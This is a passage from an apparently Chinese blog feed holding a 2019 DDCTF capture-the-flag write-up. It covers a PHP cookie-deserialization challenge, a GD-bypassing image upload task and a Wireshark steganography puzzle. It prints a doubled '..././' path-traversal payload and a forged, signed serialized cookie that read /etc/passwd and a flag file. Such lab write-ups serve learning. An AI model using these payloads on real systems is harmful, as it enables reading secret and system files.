class="keyword">var</span> $cookie_secure= <span class="keyword">FALSE</span>;</span><br><span class="line">    <span class="keyword">var</span> $activity                   = <span class="string">"DiDiCTF"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">parent</span>::auth()) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;get_key();</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;session_read()) &#123;</span><br><span class="line">                $data = <span class="string">'DiDI Welcome you %s'</span>;</span><br><span class="line">                $data = sprintf($data,$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]);</span><br><span class="line">                <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;session_create();</span><br><span class="line">                $data = <span class="string">'DiDI Welcome you'</span>;</span><br><span class="line">                <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_key</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//eancrykey  and flag under the folder</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;eancrykey =  file_get_contents(<span class="string">'../config/key.txt'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">session_read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($_COOKIE)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $session = $_COOKIE[<span class="keyword">$this</span>-&gt;cookie_name];</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($session)) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">"session not found"</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $hash = substr($session,strlen($session)<span class="number">-32</span>);</span><br><span class="line">        $session = substr($session,<span class="number">0</span>,strlen($session)<span class="number">-32</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($hash !== md5(<span class="keyword">$this</span>-&gt;eancrykey.$session)) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">"the cookie data not match"</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $session = unserialize($session);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!is_array($session) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'session_id'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'ip_address'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'user_agent'</span>]))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"nickname"</span>])) &#123;</span><br><span class="line">            $arr = <span class="keyword">array</span>($_POST[<span class="string">"nickname"</span>],<span class="keyword">$this</span>-&gt;eancrykey);</span><br><span class="line">            $data = <span class="string">"Welcome my friend %s"</span>;</span><br><span class="line">            <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">                $data = sprintf($data,$v);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">parent</span>::response($data,<span class="string">"Welcome"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($session[<span class="string">'ip_address'</span>] != $_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">'the ip addree not match'</span>.<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>($session[<span class="string">'user_agent'</span>] != $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">'the user agent not match'</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">TRUE</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">session_create</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $sessionid = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">while</span>(strlen($sessionid) &lt; <span class="number">32</span>) &#123;</span><br><span class="line">            $sessionid .= mt_rand(<span class="number">0</span>,mt_getrandmax());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $userdata = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'session_id'</span> =&gt; md5(uniqid($sessionid,<span class="keyword">TRUE</span>)),</span><br><span class="line">            <span class="string">'ip_address'</span> =&gt; $_SERVER[<span class="string">'REMOTE_ADDR'</span>],</span><br><span class="line">            <span class="string">'user_agent'</span> =&gt; $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>],</span><br><span class="line">            <span class="string">'user_data'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        $cookiedata = serialize($userdata);</span><br><span class="line">        $cookiedata = $cookiedata.md5(<span class="keyword">$this</span>-&gt;eancrykey.$cookiedata);</span><br><span class="line">        $expire = <span class="keyword">$this</span>-&gt;cookie_expiration + time();</span><br><span class="line">        setcookie(</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_name,</span><br><span class="line">            $cookiedata,</span><br><span class="line">            $expire,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_path,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_domain,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_secure</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ddctf = <span class="keyword">new</span> Session();</span><br><span class="line">$ddctf-&gt;index();</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分析源码，在109行看到危险函数unserialize，44行file_get_contents<br>到这里大致可以猜到解题流程<br>session反序列化–&gt;创建Application对象–&gt;控制/path–&gt;获取flag</p><h4 id="4、分析代码"><a href="#4、分析代码" class="headerlink" title="4、分析代码"></a>4、分析代码</h4><p><img src="https://user-images.githubusercontent.com/38073810/56416875-c6cdd100-62c4-11e9-82a2-a2006dee1132.png" alt="image"><br>从上可以知道签名规则md5(eancrykey+session)，所以我们只有得到eancrykey+session才能控制cookie。<br>分析eancrykey出现地点，得到如下两处<br><img src="https://user-images.githubusercontent.com/38073810/56417106-71de8a80-62c5-11e9-947d-4d43892a1c12.png" alt="image"><br><img src="https://user-images.githubusercontent.com/38073810/56417155-9aff1b00-62c5-11e9-8fbb-fad006d6dafa.png" alt="image"><br>由于不存在文件读取漏洞所以第一处暂时不可用，但是第二处可获取eancrykey<br>审计第二处发现sprintf函数，查阅用法：<a href="http://www.w3school.com.cn/php/func_string_sprintf.asp" target="_blank" rel="noopener">http://www.w3school.com.cn/php/func_string_sprintf.asp</a><br>构造payload：<br><img src="https://user-images.githubusercontent.com/38073810/56417422-75bedc80-62c6-11e9-8bc2-22e04f408610.png" alt="image"><br><img src="https://user-images.githubusercontent.com/38073810/56417436-85d6bc00-62c6-11e9-9785-a6d32c5f4f95.png" alt="image"><br>成功得到key</p><h4 id="5、构造session"><a href="#5、构造session" class="headerlink" title="5、构造session"></a>5、构造session</h4><p>分析Application<br><img src="https://user-images.githubusercontent.com/38073810/56417710-57a5ac00-62c7-11e9-9a85-4fc004ba1669.png" alt="image"><br>发现代码有双层防护，保证path安全。<br>sanitizepath可以使用双写绕过<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Payload:../</span><br><span class="line">双写后：..././</span><br></pre></td></tr></table></figure></p><p>再看限制字符为18。<br>此时尝试读取/etc/passwd。计算其长度，为10。此时我们可以构造如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Payload:/etc/../etc/passwd</span><br><span class="line">双写后:/etc/..././etc/passwd</span><br><span class="line">序列化后:O:11:<span class="string">"Application"</span>:1:&#123;s:4:<span class="string">"path"</span>;s:21:<span class="string">"/etc/..././etc/passwd"</span>;&#125;</span><br><span class="line">按规则签名后:O%3a11%3a<span class="string">"Application"</span>%3a1%3a&#123;s%3a4%3a<span class="string">"path"</span>%3bs%3a21%3a<span class="string">"/etc/..././etc/passwd"</span>%3b&#125;75c51ff78b04d77138ca58f797dedc0a;</span><br></pre></td></tr></table></figure></p><p><img src="https://user-images.githubusercontent.com/38073810/56418102-8c663300-62c8-11e9-93bb-dcd09e00c8a1.png" alt="image"><br>此时我们读取了/etc/passwd<br>最终在 ../config/flag.txt读到flag<br><img src="https://user-images.githubusercontent.com/38073810/56418180-c6373980-62c8-11e9-95c4-7b2bea1d74c5.png" alt="image"></p><h3 id="三、Upload-IMG"><a href="#三、Upload-IMG" class="headerlink" title="三、Upload-IMG"></a>三、Upload-IMG</h3><p><img src="https://user-images.githubusercontent.com/38073810/56418271-01396d00-62c9-11e9-9a1c-9aaadd5beb6a.png" alt="image"><br>靶机：<a href="http://117.51.148.166/upload.php" target="_blank" rel="noopener">http://117.51.148.166/upload.php</a><br>知识点：GD库渲染绕过</p><h4 id="1、上传文件"><a href="#1、上传文件" class="headerlink" title="1、上传文件"></a>1、上传文件</h4><p>首先随便上传一张jpg图片<br>然后把上传成功的图片下载到本地</p><h4 id="2、文件对比"><a href="#2、文件对比" class="headerlink" title="2、文件对比"></a>2、文件对比</h4><p>利用在线图片对比：<a href="http://www.newjson.com/Static/Tools/Diff.html" target="_blank" rel="noopener">http://www.newjson.com/Static/Tools/Diff.html</a><br><img src="https://user-images.githubusercontent.com/38073810/56418545-c257e700-62c9-11e9-8a5d-ac903fddf422.png" alt="image"><br>然后发现文件被调用GD库渲染过了，所以我们来绕过GD库</p><h4 id="3、生成payload并上传"><a href="#3、生成payload并上传" class="headerlink" title="3、生成payload并上传"></a>3、生成payload并上传</h4><p>我们直接使用大牛的Payload脚本：<a href="https://github.com/Medicean/VulApps/blob/master/c/cmseasy/1/jpg_payload.php" target="_blank" rel="noopener">https://github.com/Medicean/VulApps/blob/master/c/cmseasy/1/jpg_payload.php</a><br><img src="https://user-images.githubusercontent.com/38073810/56418862-da7c3600-62ca-11e9-9805-e53358e94223.png" alt="image"></p><h4 id="4、Get-Flag"><a href="#4、Get-Flag" class="headerlink" title="4、Get Flag"></a>4、Get Flag</h4><p><img src="https://user-images.githubusercontent.com/38073810/56419064-8faeee00-62cb-11e9-9ed8-c9412fa5448c.png" alt="image"></p><h2 id="Misc解题思路"><a href="#Misc解题思路" class="headerlink" title="Misc解题思路"></a>Misc解题思路</h2><h3 id="一、Wireshark"><a href="#一、Wireshark" class="headerlink" title="一、Wireshark"></a>一、Wireshark</h3><p><img src="https://user-images.githubusercontent.com/38073810/56419440-d5b88180-62cc-11e9-8841-93adcc1fe2dc.png" alt="image"></p><h4 id="1、下载文件"><a href="#1、下载文件" class="headerlink" title="1、下载文件"></a>1、下载文件</h4><p>用Wireshark打开，然后我们直接先导出http对象到本地<br><img src="https://user-images.githubusercontent.com/38073810/56420096-39dc4500-62cf-11e9-82bd-7bc1018d440d.png" alt="64BC6486-5381-44C5-8EA0-1ADE9B17A850"><br><img src="https://user-images.githubusercontent.com/38073810/56420099-3e086280-62cf-11e9-8358-df1c645d7d83.png" alt="7704BCEE-E57B-4A73-82E2-E2248211DAA4"><br><img src="https://user-images.githubusercontent.com/38073810/56420285-ea4a4900-62cf-11e9-9e9a-6c21ae0f1f25.png" alt="image"></p><h4 id="2、文件分析"><a href="#2、文件分析" class="headerlink" title="2、文件分析"></a>2、文件分析</h4><p>我们首先用notepade打开%5c(1)，发现他是一张png图片，然后把png头文件格式之前全部删除，保存之后修改后缀为.png<br><img src="https://user-images.githubusercontent.com/38073810/56420420-79576100-62d0-11e9-94b5-7f55ecb987df.png" alt="E2210F4A-55C6-4B25-9060-33DD84E1AF4B"><br><img src="https://user-images.githubusercontent.com/38073810/56420426-7bb9bb00-62d0-11e9-8033-1fab298125ec.png" alt="EA28F0CF-DB21-4068-9900-AF81BE4967F6"><br>打开后根据经验判断，图片高度应该被修改过了，我们把图片高度稍微调高一点，得到key<br><img src="https://user-images.githubusercontent.com/38073810/56420495-bf142980-62d0-11e9-8634-ff79ec22cfc2.png" alt="5124FCA7-ED8A-4A3C-8D3A-6A0C868560D5"><br><img src="https://user-images.githubusercontent.com/38073810/56420509-caffeb80-62d0-11e9-938b-9986e8aa3f30.png" alt="1C7AC9CC-7F60-4ADD-AE93-59B14C44052D"><br>然后我们继续用notepade打开%5c(4)，发现也是一张png图片，然后把png头文件格式之前全部删除，保存之后修改后缀为.png<br><img src="https://user-images.githubusercontent.com/38073810/56420579-229e5700-62d1-11e9-8015-5e603f2493cc.png" alt="0E25F7EF-52A3-40DF-9EB1-9C3A3447D0E0"><br><img src="https://user-images.githubusercontent.com/38073810/56420583-2631de00-62d1-11e9-94ef-94ffbcae77cb.png" alt="BFB7E879-0842-4FB2-866E-9D28EFDB354C"><br>到这里基本就能猜到是图片加密隐藏信息<br>当然如果猜不出我们也可以从这里看出加密的网址<br><img src="https://user-images.githubusercontent.com/38073810/56420643-6a24e300-62d1-11e9-8cb2-8d7065434f3a.png" alt="BE6D35D6-BAA4-4073-B8A0-3DC6DF29FB3A"></p><h4 id="3、图片解密"><a href="#3、图片解密" class="headerlink" title="3、图片解密"></a>3、图片解密</h4><p>在线图片添加/解密隐藏信息(隐写术)工具：<a href="http://tools.jb51.net/aideddesign/img_add_info" target="_blank" rel="noopener">http://tools.jb51.net/aideddesign/img_add_info</a><br><img src="https://user-images.githubusercontent.com/38073810/56420660-7872ff00-62d1-11e9-8970-c896fbcbc723.png" alt="479F8B5A-8E56-43D7-AB7C-D5EF368433B4"><br><img src="https://user-images.githubusercontent.com/38073810/56420667-7ad55900-62d1-11e9-8c92-84712473ed11.png" alt="F0AECFEE-C793-4B54-B716-1E0E22E714EA"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这次比赛一共解出3题Web、1题Misc的流量分析和1个签到，总共拿到561分。&lt;br&gt;排名目前在224名。因为主办方现在还在ban掉作弊选手，所以还有上升空间（手动滑稽～）&lt;br&gt;&lt;img src=&quot;https://user-images.githubuserconten
      
    
    </summary>
    
      <category term="ctf" scheme="https:///login546.github.io/categories/ctf/"/>
    
    
      <category term="2019-DDCTF-writeup" scheme="https:///login546.github.io/tags/2019-DDCTF-writeup/"/>
    
  </entry>
  
</feed>
